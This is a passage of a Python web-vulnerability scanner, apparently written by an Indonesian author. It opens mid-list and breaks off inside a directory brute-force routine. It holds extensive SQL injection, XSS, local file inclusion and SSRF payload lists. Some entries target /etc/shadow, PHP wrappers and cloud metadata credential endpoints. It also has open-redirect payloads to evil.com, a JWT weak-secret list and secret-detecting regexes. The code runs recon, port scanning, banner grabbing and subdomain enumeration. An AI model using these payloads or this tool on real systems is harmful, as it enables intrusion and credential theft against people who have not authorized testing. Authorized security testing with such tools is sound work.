    "SE%0aLECT", "SEL%0dECT", "SEL%09ECT",
    "/**/UNION/**/SELECT", "UNION%23SELECT", "UNION--SELECT",
    "1%27%20OR%201=1--", "1%2527%2520OR%25201=1--",
    "1%c0%a7OR%c0%a71=1--", "' %2b ' OR 1=1--",
    "1/**/OR/**/1=1", "1 OR 1=1 LIMIT 1--",
    "1 OR 1=1 ORDER BY 1--", "(SELECT * FROM (SELECT 1) x)",
    "1 UNION(SELECT 1)", "1 UNION/**/SELECT/**/1",
    "0x31 UNION SELECT 0x31", "1' AND (SELECT 1 FROM DUAL)",
    "1' AND 1=1-- -", "1' AND 1=1#-", "1' AND 1=1;--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
    "<svg onLoad=alert(1)>",
    "<body onload=alert(1)>", "<body/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<input autofocus onfocus=alert(1)>",
    "<input autofocus/onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<video/src=x/onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\"onmouseover=alert(1) x=\"",
    "'onmouseover=alert(1) x='",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval('ale'+'rt(1)')</script>",
    "<script>window['alert'](1)</script>",
    "<script>top['alert'](1)</script>",
    "<script>self['alert'](1)</script>",
    "<script>this['alert'](1)</script>",
    "<script>alert`1`</script>",
    "<script>alert(1)//</script>",
    "<script>alert(1);/*",
    "<!--<script>alert(1)</script>-->",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "<script>alert\\u0028 1 \\u0029</script>",
    "<script>alert\\x281\\x29</script>",
    "<script src=data:,alert(1)></script>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><script>alert(1)</script></math>"
]

XSS_DOM_SINKS = [
    "document.write", "document.writeln",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "eval(", "setTimeout(", "setInterval(",
    "new Function(", "Function(",
    "document.location", "window.location",
    "location.href", "location.hash", "location.search",
    "location.pathname", "location.assign", "location.replace",
    "element.src", "element.href", "element.action",
    "script.src", "script.text", "script.textContent",
    "iframe.src", "iframe.srcdoc",
    "document.URL", "document.documentURI",
    "document.referrer", "window.name"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.php",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../etc/issue",
    "../../../../etc/motd",
    "../../../../etc/group",
    "../../../../etc/resolv.conf",
    "../../../../etc/fstab",
    "../../../../etc/crontab",
    "../../../../etc/apache2/apache2.conf",
    "../../../../etc/nginx/nginx.conf",
    "../../../../etc/ssh/sshd_config",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../proc/self/status",
    "../../../../proc/self/fd/0",
    "../../../../proc/version",
    "../../../../proc/cpuinfo",
    "../../../../proc/meminfo",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/apache/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/nginx/error.log",
    "../../../../var/log/auth.log",
    "../../../../var/log/syslog",
    "../../../../var/log/messages",
    "../../../../var/log/httpd/access_log",
    "../../../../var/log/httpd/error_log",
    "../../../../var/www/html/index.php",
    "../../../../var/www/html/config.php",
    "../../../../var/www/html/wp-config.php",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\boot.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:/windows/win.ini",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file:///proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=../wp-config.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=../../etc/passwd",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/read=string.toupper/resource=index.php",
    "php://input",
    "php://stdin",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "data://text/plain,<?php phpinfo(); ?>",
    "expect://id",
    "expect://whoami",
    "expect://ls",
    "input://",
    "zip://file.zip%23index.php",
    "phar://file.phar/index.php",
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "/proc/version"
]

LFI_SIGNATURES = [
    "root:x:0:0", "root:*:0:0", "root:$", "root:!:",
    "daemon:x:", "bin:x:", "sys:x:", "sync:x:",
    "games:x:", "man:x:", "lp:x:", "mail:x:",
    "/bin/bash", "/bin/sh", "/bin/false", "/sbin/nologin",
    "/usr/sbin/nologin", "/bin/sync",
    "[extensions]", "[fonts]", "[mci extensions]",
    "for 16-bit app support", "[386Enh]", "[drivers]",
    "[Mail]", "[MCI Extensions.BAK]",
    "PATH=", "USER=", "HOME=", "SHELL=", "HOSTNAME=",
    "DOCUMENT_ROOT=", "SERVER_ADMIN=", "HTTP_USER_AGENT=",
    "SERVER_SOFTWARE=", "SCRIPT_FILENAME=",
    "PD9waHA", "PHBocC", "PD9waHAgcGhwaW5mby",
    "<?php", "#!/bin/", "127.0.0.1", "nameserver",
    "Linux version", "Microsoft Windows", "Ubuntu",
    "Debian", "CentOS", "Red Hat",
    "uid=", "gid=", "groups="
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/instance-type",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/api/token",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/user-data/",
    "http://127.0.0.1/", "http://127.0.0.1:80/",
    "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/", "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/", "http://127.0.0.1:9200/",
    "http://localhost/", "http://localhost:80/",
    "http://localhost:22/", "http://localhost:3306/",
    "http://localhost:6379/", "http://localhost:8080/",
    "http://[::1]/", "http://[::ffff:127.0.0.1]/",
    "http://[0:0:0:0:0:0:0:1]/",
    "http://0.0.0.0/", "http://0/",
    "http://2130706433/", "http://017700000001/",
    "http://0x7f000001/", "http://127.1/",
    "http://127.0.1/", "http://127.000.000.001/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:11211/stats",
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:3306/_",
    "gopher://127.0.0.1:25/_EHLO",
    "sftp://127.0.0.1:22/",
    "ldap://127.0.0.1:389/",
    "tftp://127.0.0.1:69/",
    "ftp://127.0.0.1:21/",
    "http://evil.com/",
    "http://attacker.com/",
    "http://burpcollaborator.net/",
    "http://interact.sh/"
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "instance-type", "local-hostname",
    "local-ipv4", "public-hostname", "public-ipv4",
    "security-credentials", "iam", "computeMetadata",
    "root:x:0:0", "redis_version", "redis_mode", "redis_git_sha1",
    "SSH-2.0", "MySQL", "PostgreSQL", "Memcached",
    "PATH=", "USER=", "HOME=", "HOSTNAME=",
    "AccessKeyId", "SecretAccessKey", "Token",
    "connectionString", "amqp://", "mongodb://",
    "[extensions]", "[fonts]",
    "220 ", "FTP server", "SMTP", "LDAP"
]

OPEN_REDIRECT_PARAMS = [
    "url", "uri", "link", "redirect", "redirect_uri",
    "redirect_url", "redirectUri", "redirectUrl",
    "return", "return_to", "return_url", "returnTo", "returnUrl",
    "next", "next_url", "nextUrl",
    "goto", "go", "target", "dest", "destination",
    "destination_url", "dest_url",
    "redir", "redir_url", "redirect_to", "redirectTo",
    "continue", "continue_url",
    "callback", "callback_url", "forward", "forward_url",
    "view", "view_url", "site", "site_url", "domain",
    "host", "hostname", "ref", "referer", "referrer",
    "out", "out_url", "exit", "exit_url", "jump", "jump_url",
    "image", "image_url", "img", "img_url",
    "file", "file_url", "path", "path_url",
    "load", "load_url", "fetch", "fetch_url",
    "open", "open_url", "click", "click_url",
    "login", "login_url", "logout", "logout_url",
    "back", "back_url", "home", "home_url"
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com", "//evil.com/",
    "https://evil.com", "http://evil.com",
    "https://evil.com/",
    "/\\evil.com", "/\\/evil.com", "\\\\evil.com",
    "//google.com", "https://google.com",
    "//attacker.com", "https://attacker.com",
    "////evil.com", "//evil.com/%2F..",
    "/%09/evil.com", "/%0d/evil.com", "/%0a/evil.com",
    "https:evil.com", "http:evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "//evil.com@legit.com", "https://legit.com@evil.com",
    "https://evil.com#legit.com", "https://evil.com?legit.com",
    "/redirect?url=//evil.com",
    "//evil.com/%09", "//evil.com/%0d%0a"
]

SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "Content-Security-Policy-Report-Only",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
    "Feature-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Embedder-Policy",
    "Cross-Origin-Resource-Policy",
    "X-Permitted-Cross-Domain-Policies",
    "X-Download-Options",
    "X-DNS-Prefetch-Control",
    "Expect-CT",
    "Report-To",
    "NEL",
    "Clear-Site-Data"
]

DANGEROUS_METHODS = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key",
    "jwt", "token", "test", "dev", "prod", "denz",
    "secretkey", "secret_key", "jwt_secret", "jwtsecret",
    "changeme", "default", "qwerty", "letmein",
    "your-256-bit-secret", "your_jwt_secret",
    "supersecret", "mysecret", "topsecret",
    "1234567890", "12345678", "123456789", "password123",
    "admin123", "root", "toor", "pass", "test123"
]

CORS_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "http://localhost",
    "https://localhost",
    "http://127.0.0.1",
    "https://google.com"
]

GRAPHQL_INTROSPECTION = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
"""

API_KEY_PATTERNS = [
    (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
    (r'(?i)aws[_\-]?secret[_\-]?access[_\-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})', "AWS Secret Key"),
    (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
    (r'ya29\.[0-9A-Za-z\-_]+', "Google OAuth Token"),
    (r'sk_live_[0-9a-zA-Z]{24,}', "Stripe Live Key"),
    (r'sk_test_[0-9a-zA-Z]{24,}', "Stripe Test Key"),
    (r'pk_live_[0-9a-zA-Z]{24,}', "Stripe Publishable Live"),
    (r'pk_test_[0-9a-zA-Z]{24,}', "Stripe Publishable Test"),
    (r'ghp_[0-9a-zA-Z]{36}', "GitHub Personal Token"),
    (r'gho_[0-9a-zA-Z]{36}', "GitHub OAuth Token"),
    (r'ghu_[0-9a-zA-Z]{36}', "GitHub User Token"),
    (r'ghs_[0-9a-zA-Z]{36}', "GitHub Server Token"),
    (r'ghr_[0-9a-zA-Z]{36}', "GitHub Refresh Token"),
    (r'xox[baprs]-[0-9a-zA-Z\-]{10,72}', "Slack Token"),
    (r'EAACEdEose0cBA[0-9A-Za-z]+', "Facebook Access Token"),
    (r'(?i)private[_\-]?key["\']?\s*[:=]\s*["\']?-----BEGIN', "Private Key"),
    (r'-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----', "Private Key PEM"),
    (r'(?i)mongodb(\+srv)?://[^\s"\']+', "MongoDB URI"),
    (r'(?i)postgres(ql)?://[^\s"\']+', "PostgreSQL URI"),
    (r'(?i)mysql://[^\s"\']+', "MySQL URI"),
    (r'(?i)redis://[^\s"\']+', "Redis URI"),
    (r'(?i)amqp://[^\s"\']+', "AMQP URI"),
    (r'(?i)api[_\-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})', "Generic API Key"),
    (r'(?i)apikey["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})', "Generic API Key 2"),
    (r'(?i)access[_\-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{16,})', "Access Token"),
    (r'(?i)auth[_\-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{16,})', "Auth Token"),
    (r'(?i)secret[_\-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})', "Secret Key"),
    (r'(?i)client[_\-]?secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})', "Client Secret"),
    (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}', "Bearer Token"),
    (r'(?i)ssh-rsa\s+AAAA[A-Za-z0-9+/=]+', "SSH Public Key"),
    (r'(?i)sendgrid[^\s]*SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}', "SendGrid Key"),
    (r'(?i)twilio[^\s]*SK[0-9a-fA-F]{32}', "Twilio Key"),
    (r'(?i)heroku[^\s]*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', "Heroku API Key"),
    (r'(?i)firebase[^\s]*AIza[0-9A-Za-z\-_]{35}', "Firebase Key"),
    (r'(?i)cloudflare[^\s]*[a-zA-Z0-9_\-]{37}', "Cloudflare Token"),
    (r'(?i)digitalocean[^\s]*dop_v1_[a-f0-9]{64}', "DigitalOcean Token"),
    (r'(?i)npm_[a-zA-Z0-9]{36}', "NPM Token"),
    (r'(?i)pypi-[a-zA-Z0-9_\-]{50,}', "PyPI Token"),
    (r'(?i)sq0atp-[0-9A-Za-z\-_]{22}', "Square Access Token"),
    (r'(?i)sq0csp-[0-9A-Za-z\-_]{43}', "Square Secret"),
    (r'(?i)shopify[^\s]*shpat_[a-fA-F0-9]{32}', "Shopify Token"),
    (r'(?i)discord[^\s]*[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}', "Discord Token"),
    (r'(?i)telegram[^\s]*[0-9]{8,10}:[a-zA-Z0-9_-]{35}', "Telegram Bot Token")
]

TAKEOVER_SIGNATURES = {
    "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
    "GitHub Pages": ["There isn't a GitHub Pages site here"],
    "Heroku": ["No such app", "herokuapp.com", "No such app. Are you sure"],
    "Shopify": ["Sorry, this shop is currently unavailable"],
    "Fastly": ["Fastly error: unknown domain"],
    "Ghost": ["Do you want to register"],
    "Tumblr": ["There's nothing here."],
    "WordPress": ["Do you want to register", "WordPress.com"],
    "Zendesk": ["Help Center Closed"],
    "Bitbucket": ["Repository not found"],
    "Netlify": ["Not Found - Request ID", "page not found"],
    "Surge": ["project not found", "Surge - project not found"],
    "Pantheon": ["The gods are wise", "404 error unknown site"],
    "Azure": ["404 Web Site not found", "This site is not available"],
    "Cargo": ["<title>404 &mdash; File not found</title>"],
    "UserVoice": ["This UserVoice subdomain is currently available"],
    "StatusPage": ["Status page configured incorrectly"],
    "Unbounce": ["The requested URL was not found on this server"],
    "Smartling": ["Domain is not configured", "Page not found"],
    "Tilda": ["Please renew your subscription"],
    "Readme.io": ["Project doesnt exist... yet!"],
    "Helpjuice": ["We could not find what you're looking for"],
    "Helpscout": ["No settings were found for this company"],
    "Freshdesk": ["May be this is still fresh!"],
    "Pingdom": ["Sorry, couldn't find the status page"],
    "SurveyMonkey": ["This survey is currently closed"],
    "Teamwork": ["Oops - We didn't find your site"],
    "Intercom": ["This page is reserved for artistic purposes"],
    "Kajabi": ["You are being redirected", "Page not found"],
    "Thinkific": ["You may have mistyped the address"],
    "Canny": ["Company not found", "There is no such company"],
    "Ngrok": ["ngrok.io not found", "Tunnel not found"],
    "Cloudfront": ["Bad request", "ERROR: The request could not be satisfied"],
    "Gitlab": ["The page you're looking for could not be found"],
    "Launchrock": ["Something went wrong", "LaunchRock"]
}


#phase1
class ReconPhase:
    def __init__(self, target):
        self.target = normalize_url(target)
        self.parsed = urlparse(self.target)
        self.host = self.parsed.hostname
        self.results = {}

    def dns_lookup(self):
        try:
            ip = socket.gethostbyname(self.host)
            self.results["ip"] = ip
            success(f"DNS: {self.host} -> {ip}")
            return ip
        except Exception as e:
            error(f"DNS fail: {e}")
            return None

    def dns_records(self):
        records = {}
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]:
            try:
                cmd = ["nslookup", "-type=" + rtype, self.host]
                out = subprocess.check_output(
                    cmd, timeout=8, stderr=subprocess.STDOUT
                ).decode(errors="ignore")
                if out and "can't find" not in out.lower():
                    records[rtype] = out[:800]
                    success(f"DNS {rtype}: OK")
            except Exception:
                pass
        self.results["dns_records"] = records
        return records

    def reverse_dns(self, ip):
        try:
            h = socket.gethostbyaddr(ip)[0]
            self.results["reverse_dns"] = h
            success(f"Reverse DNS: {ip} -> {h}")
        except Exception:
            pass

    def whois_lite(self):
        for server in ["whois.iana.org", "whois.verisign-grs.com"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(8)
                s.connect((server, 43))
                s.send((self.host + "\r\n").encode())
                data = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 200000:
                        break
                s.close()
                text = data.decode(errors="ignore")
                self.results["whois"] = text[:8000]
                success(f"WHOIS via {server}")
                return
            except Exception:
                continue
        warning("WHOIS fail")

    def ssl_info(self):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.host, 443), timeout=8) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    subj = dict(x[0] for x in cert.get("subject", []))
                    iss = dict(x[0] for x in cert.get("issuer", []))
                    self.results["ssl"] = {
                        "version": version,
                        "cipher": cipher[0],
                        "subject": subj,
                        "issuer": iss,
                        "notBefore": cert.get("notBefore"),
                        "notAfter": cert.get("notAfter")
                    }
                    success(f"SSL: {version} / {cipher[0]}")
                    if version in ("TLSv1", "TLSv1.1", "SSLv3"):
                        add_finding("HIGH", "Weak TLS Protocol", self.target,
                                    f"Deprecated protocol {version}",
                                    version,
                                    "Upgrade ke TLS 1.2 atau 1.3")
                    if "sha1" in cipher[0].lower():
                        add_finding("HIGH", "Weak Cipher", self.target,
                                    f"SHA1 cipher {cipher[0]}", cipher[0],
                                    "Ganti ke cipher modern")
        except Exception as e:
            warning(f"SSL fail: {e}")

    def tech_detect(self):
        techs = []
        code, headers, body, _ = http_get(self.target)
        if code == 0:
            return techs
        server = headers.get("Server", "")
        powered = headers.get("X-Powered-By", "")
        if server:
            techs.append(("Server", server))
        if powered:
            techs.append(("Powered-By", powered))
        text = body.decode(errors="ignore")
        fingerprints = {
            "WordPress": ["wp-content", "wp-includes", "wp-json"],
            "Drupal": ["Drupal.settings", "sites/default", "drupal.js"],
            "Joomla": ["/components/com_", "joomla", "Joomla!"],
            "Magento": ["Mage.Cookies", "mage/cookies"],
            "PrestaShop": ["prestashop", "presta"],
            "React": ["_reactRoot", "react.production", "react-dom"],
            "Vue": ["vue.min.js", "__vue__", "vue.js"],
            "Angular": ["ng-app", "angular.min.js", "ng-version"],
            "jQuery": ["jquery.min.js", "jquery.js", "jQuery"],
            "Bootstrap": ["bootstrap.min.css", "bootstrap.js"],
            "Tailwind": ["tailwind"],
            "Laravel": ["laravel_session", "XSRF-TOKEN", "laravel"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "Flask": ["flask", "werkzeug"],
            "Express": ["express", "x-powered-by: express"],
            "Next.js": ["__NEXT_DATA__", "_next/static"],
            "Nuxt": ["__NUXT__", "_nuxt/"],
            "Gatsby": ["gatsby", "___gatsby"],
            "Cloudflare": ["cloudflare", "cf-ray"],
            "Nginx": ["nginx"],
            "Apache": ["apache"],
            "IIS": ["iis", "microsoft-iis"],
            "Tomcat": ["tomcat", "coyote"],
            "PHP": ["php", "phpsessid"],
            "ASP.NET": ["asp.net", "aspnet", "__viewstate"],
            "Ruby on Rails": ["rails", "_session_id"],
            "Node.js": ["node", "express"],
            "Python": ["python", "wsgi"],
            "Java": ["jsessionid", "java"],
            "Go": ["go-http", "golang"],
            "MongoDB": ["mongodb"],
            "MySQL": ["mysql"],
            "PostgreSQL": ["postgresql", "postgres"],
            "Redis": ["redis"],
            "Elasticsearch": ["elasticsearch"],
            "Kibana": ["kibana"],
            "Grafana": ["grafana"],
            "Jenkins": ["jenkins"],
            "GitLab": ["gitlab"],
            "Gitea": ["gitea"],
            "Jira": ["jira"],
            "Confluence": ["confluence"],
            "phpMyAdmin": ["phpmyadmin"],
            "Adminer": ["adminer"],
            "Wordfence": ["wordfence"],
            "Sucuri": ["sucuri"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "AWS": ["amazonaws", "aws"],
            "GCP": ["googleusercontent", "gstatic"],
            "Azure": ["azure", "windows.net"]
        }
        for name, sigs in fingerprints.items():
            for sig in sigs:
                if sig.lower() in text.lower() or sig.lower() in str(headers).lower():
                    if ("Tech", name) not in techs:
                        techs.append(("Tech", name))
                    break
        self.results["tech"] = techs
        for t in techs:
            success(f"{t[0]}: {t[1]}")
        return techs

    def security_headers_check(self):
        code, headers, _, _ = http_get(self.target)
        if code == 0:
            return
        present = []
        missing = []
        for h in SECURITY_HEADERS:
            if h in headers:
                present.append((h, headers[h]))
                success(f"Present: {h}")
            else:
                missing.append(h)
        self.results["headers_present"] = present
        self.results["headers_missing"] = missing
        for h in missing:
            if h in ("Strict-Transport-Security", "Content-Security-Policy",
                     "X-Frame-Options", "X-Content-Type-Options"):
                add_finding("MEDIUM", "Missing Security Header", self.target,
                            f"Header {h} tidak ada", "",
                            f"Tambahkan header {h}")
            else:
                add_finding("LOW", "Missing Security Header", self.target,
                            f"Header {h} tidak ada", "",
                            f"Tambahkan header {h}")

    def server_info(self):
        code, headers, _, _ = http_get(self.target)
        if code == 0:
            return
        leaked = []
        for h in ["Server", "X-Powered-By", "X-AspNet-Version",
                  "X-AspNetMvc-Version", "X-Generator", "X-Drupal-Cache",
                  "X-Runtime", "X-Version", "X-Backend-Server",
                  "X-Debug-Token", "X-Debug-Token-Link"]:
            if h in headers:
                leaked.append((h, headers[h]))
                add_finding("LOW", "Info Disclosure", self.target,
                            f"Header {h}: {headers[h]}",
                            headers[h],
                            "Hapus atau minimalisir header versi")
        self.results["leaked_headers"] = leaked

    def robots_sitemap(self):
        for path in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
                     "/humans.txt", "/security.txt",
                     "/.well-known/security.txt"]:
            url = self.target.rstrip("/") + path
            code, _, body, _ = http_get(url)
            if code == 200 and body:
                text = body.decode(errors="ignore")
                self.results.setdefault("misc_files", {})[path] = text[:5000]
                success(f"Found: {path}")

    def run(self):
        title("PHASE 1 - RECON")
        ip = self.dns_lookup()
        if ip:
            self.reverse_dns(ip)
        self.dns_records()
        self.whois_lite()
        self.ssl_info()
        self.tech_detect()
        self.security_headers_check()
        self.server_info()
        self.robots_sitemap()
        return self.results

#phase2
class PortScanPhase:
    def __init__(self, host, ports=None):
        self.host = host
        self.ports = ports or COMMON_PORTS
        self.open_ports = []
        self.banners = {}

    def _check(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            r = s.connect_ex((self.host, port))
            s.close()
            return port if r == 0 else None
        except Exception:
            return None

    def scan(self, threads=100):
        info(f"Scanning {len(self.ports)} ports on {self.host}")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(self._check, p): p for p in self.ports}
            for f in as_completed(futures):
                r = f.result()
                if r:
                    self.open_ports.append(r)
                    success(f"Port {r} OPEN")
        return self.open_ports

    def grab_banner(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, port))
            if port in (80, 8000, 8080, 8081, 8888):
                s.send(b"HEAD / HTTP/1.0\r\nHost: " +
                       self.host.encode() + b"\r\n\r\n")
            elif port in (443, 8443, 9443):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.host)
                s.send(b"HEAD / HTTP/1.0\r\nHost: " +
                       self.host.encode() + b"\r\n\r\n")
            elif port == 25:
                s.send(b"EHLO test\r\n")
            elif port == 6379:
                s.send(b"INFO\r\n")
            elif port == 9200:
                s.send(b"GET / HTTP/1.0\r\n\r\n")
            banner = s.recv(2048).decode(errors="ignore").strip()
            s.close()
            if banner:
                self.banners[port] = banner[:500]
                return banner[:500]
        except Exception:
            pass
        return None

    def run(self):
        title("PHASE 2 - PORT SCAN")
        self.scan()
        if self.open_ports:
            title("BANNER GRABBING")
            for p in self.open_ports:
                b = self.grab_banner(p)
                if b:
                    print(f"{BRIGHT_GREEN}[{p}]{RESET} {b[:200]}")
        return {"open_ports": self.open_ports, "banners": self.banners}

#phase3
class SubdomainPhase:
    def __init__(self, domain, subs=None):
        self.domain = domain.replace("http://", "").replace(
            "https://", "").split("/")[0]
        self.subs = subs or COMMON_SUBDOMAINS
        self.found = []

    def _check(self, sub):
        try:
            full = f"{sub}.{self.domain}"
            ip = socket.gethostbyname(full)
            return (full, ip)
        except Exception:
            return None

    def scan(self, threads=30):
        info(f"Enumerating {len(self.subs)} subdomains")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(self._check, s): s for s in self.subs}
            for f in as_completed(futures):
                r = f.result()
                if r:
                    self.found.append(r)
                    success(f"Subdomain: {r[0]} -> {r[1]}")
        return self.found

    def run(self):
        title("PHASE 3 - SUBDOMAIN ENUMERATION")
        self.scan()
        return {"subdomains": self.found}

#phase4
class DirBrutePhase:
    def __init__(self, base_url, wordlist=None, recursive=False):
        self.base = base_url.rstrip("/")
        self.wordlist = wordlist or COMMON_PATHS
        self.recursive = recursive
        self.found = []
        self.baseline = None

    def _get_baseline(self):
        try:
            test_url = self.base + "/" + "".join(
                random.choices(string.ascii_lowercase, k=20))
            code, headers, body, _ = http_get(test_url, timeout=8)
            if code in (200, 404, 403, 500):
                return {
                    "code": code,
                    "length": len(body),
                    "body_hash": hashlib.md5(body).hexdigest()
                }
        except Exception:
            pass
        return None

    def _check(self, path):
        url = self.base + path
        try:
            code, headers, body, _ = http_get(url, timeout=8)
            if code == 0:
                return None
            size = len(body)
            if self.baseline:
                if code == self.baseline["code"]:
                    if abs(size - self.baseline["length"]) < 50:
                        return None
            if code in (200, 201, 204, 301, 302, 303, 307, 308,
